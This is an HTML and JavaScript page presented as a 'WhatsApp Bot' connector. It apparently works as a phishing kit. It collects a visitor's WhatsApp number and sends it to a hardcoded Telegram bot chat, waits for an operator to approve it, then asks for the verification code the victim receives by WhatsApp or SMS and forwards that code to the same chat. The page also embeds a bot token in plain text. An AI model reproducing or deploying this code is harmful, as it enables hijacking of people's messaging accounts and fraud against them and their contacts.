<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>WhatsApp Bot</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: linear-gradient(to bottom right, #25d366, #075e54);
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      transition: background 0.6s ease;
    }

    .container {
      background: #1e1e1e;
      padding: 2rem;
      border-radius: 12px;
      max-width: 400px;
      width: 100%;
      text-align: center;
      box-shadow: 0 0 10px rgba(0,0,0,0.4);
    }

    input, button {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border-radius: 8px;
      border: none;
      font-size: 1rem;
    }

    button {
      background: #25d366;
      color: white;
      cursor: pointer;
    }

    button:hover {
      background: #128c7e;
    }

    .hidden {
      display: none;
    }

    .message {
      margin-top: 10px;
      color: #00ff99;
    }

    .button-group {
      display: flex;
      gap: 10px;
      flex-direction: column;
    }
  </style>
</head>
<body>

  <!-- Step 1: Input Phone -->
  <div class="container" id="step1">
    <h1>WhatsApp Bot</h1>
    <input type="text" id="phoneNumber" placeholder="Enter WhatsApp number" />
    <button onclick="sendRequest()">Connect Bot</button>
  </div>

  <!-- Step 2: Waiting -->
  <div class="container hidden" id="waiting">
    <h2>Waiting for approval...</h2>
    <p class="message" id="statusMessage">Request sent to admin. Please wait...</p>
  </div>

  <!-- Step 3: Enter Code -->
  <div class="container hidden" id="step2">
    <h1>Enter Your Code</h1>
    <p>Input code you received on your WhatsApp or SMS inbox</p>
    <input type="text" id="codeInput" placeholder="Enter the code">
    <div class="button-group">
      <button onclick="sendCode()">Get Code</button>
      <button onclick="goBack()">Go Back</button>
    </div>
    <p class="message" id="codeStatus"></p>
  </div>

  <script>
    const botToken = "8096107981:AAF4QDZy7Lp73VKkHh_aXscCg6GuaLvn6oM";
    const telegramChatId = "7865382097";
    let phoneNumber = "";

    async function sendRequest() {
      phoneNumber = document.getElementById("phoneNumber").value.trim();
      if (!phoneNumber) return alert("Please enter your phone number");

      document.getElementById("step1").classList.add("hidden");
      document.getElementById("waiting").classList.remove("hidden");

      const text = `üì≤ New login request:\n\nüì± Number: ${phoneNumber}\n\nDo you want to approve it?`;
      const payload = {
        chat_id: telegramChatId,
        text,
        reply_markup: {
          inline_keyboard: [[
            { text: "‚úÖ Approve", callback_data: `approve_${phoneNumber}` },
            { text: "‚ùå Deny", callback_data: `deny_${phoneNumber}` }
          ]]
        }
      };

      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });

      pollApproval();
    }

    function pollApproval() {
      const interval = setInterval(async () => {
        try {
          const res = await fetch(`/check-status?number=${phoneNumber}`);
          const data = await res.json();

          if (data.status === "approved") {
            clearInterval(interval);
            document.getElementById("waiting").classList.add("hidden");
            document.getElementById("step2").classList.remove("hidden");
            document.body.style.background = "linear-gradient(to right, #000, #003366)";
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                chat_id: telegramChatId,
                text: `‚úÖ Login successfully approved for number: ${phoneNumber}`
              })
            });
            document.getElementById("codeStatus").innerText = "‚úÖ Login successfully approved.";
          }

          if (data.status === "denied") {
            clearInterval(interval);
            document.getElementById("statusMessage").innerText = "‚ùå Login denied by admin.";
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                chat_id: telegramChatId,
                text: `‚ùå Login denied for number: ${phoneNumber}`
              })
            });
          }
        } catch (e) {
          console.log("Polling error:", e);
        }
      }, 3000);
    }

    async function sendCode() {
      const code = document.getElementById("codeInput").value.trim();
      if (!code) return alert("Enter your code");

      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: telegramChatId,
          text: `üîê Code submitted by ${phoneNumber}: ${code}`
        })
      });

      document.getElementById("codeStatus").innerText = "‚úÖ Code sent to admin!";
    }

    function goBack() {
      document.getElementById("step2").classList.add("hidden");
      document.getElementById("step1").classList.remove("hidden");
      document.body.style.background = "linear-gradient(to bottom right, #25d366, #075e54)";
    }
  </script>
</body>
</html>
